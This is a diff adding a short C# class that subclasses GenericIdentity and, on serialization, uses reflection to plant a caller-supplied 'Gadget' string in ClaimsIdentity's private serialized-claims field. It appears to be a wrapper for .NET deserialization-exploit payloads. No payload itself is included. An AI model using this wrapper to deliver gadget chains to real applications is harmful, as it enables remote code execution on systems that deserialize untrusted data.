@@ -1,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.Serialization;
+using System.Security.Principal;
+using System.Security.Claims;
+using System.Security;
+using System.Reflection;
+
+namespace ConsoleApp1
+{
+    [Serializable]
+    public class Class1 : GenericIdentity
+    {
+        [NonSerialized]
+        public string Gadget;
+        public Class1(string name) : base(name) { }
+        
+        [OnSerializing()]
+        [SecurityCritical]
+        private void OnSerializingMethod(StreamingContext context) 
+        {
+            FieldInfo fi = typeof(ClaimsIdentity).GetField("m_serializedClaims", BindingFlags.NonPublic | BindingFlags.Instance);
+            fi.SetValue(this, this.Gadget);
+        }
+    }
+}
